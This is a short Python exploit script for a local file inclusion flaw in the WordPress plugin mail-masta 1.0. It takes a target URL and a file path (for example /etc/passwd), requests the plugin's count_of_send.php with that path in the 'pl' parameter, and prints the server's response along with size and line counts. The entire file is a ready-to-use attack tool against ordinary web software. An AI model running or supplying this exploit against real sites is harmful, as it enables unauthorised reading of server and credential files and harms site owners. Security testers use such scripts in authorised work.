#!/usr/bin/env python3
import argparse
import requests

# CONSTANTS
script_version = "0.1.1-dev"

# ARGUMENTS
parser = argparse.ArgumentParser(description="Wordpress plugin mail-masta 1.0 LFI")
parser.add_argument("-u", dest="url", required=True, help="Target URL")
parser.add_argument("-f", dest="file", required=True, help="Path to file to dump (ex: /etc/passwd)")
parser.add_argument("-V", "--version", action="version", version=script_version, help="Show version information")
args = parser.parse_args()

crafted_url = f'{args.url}/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl={args.file}'

try:
    print(f"script v{script_version}\n")
    print(f'[*] Trying payload {crafted_url}\n')
    response = requests.get(crafted_url)
    content = response.text
    res_code = response.status_code
    res_size = int(response.headers.get('Content-Length') or 0)
    lines_count = len(content.splitlines())
    words_count = len(content.split())

    print(f'[*] Status: {res_code}, Size: {res_size}, Words: {words_count}, Lines: {lines_count}\n')
    print(content)
except Exception as e:
    print(f'[Error] {e}')

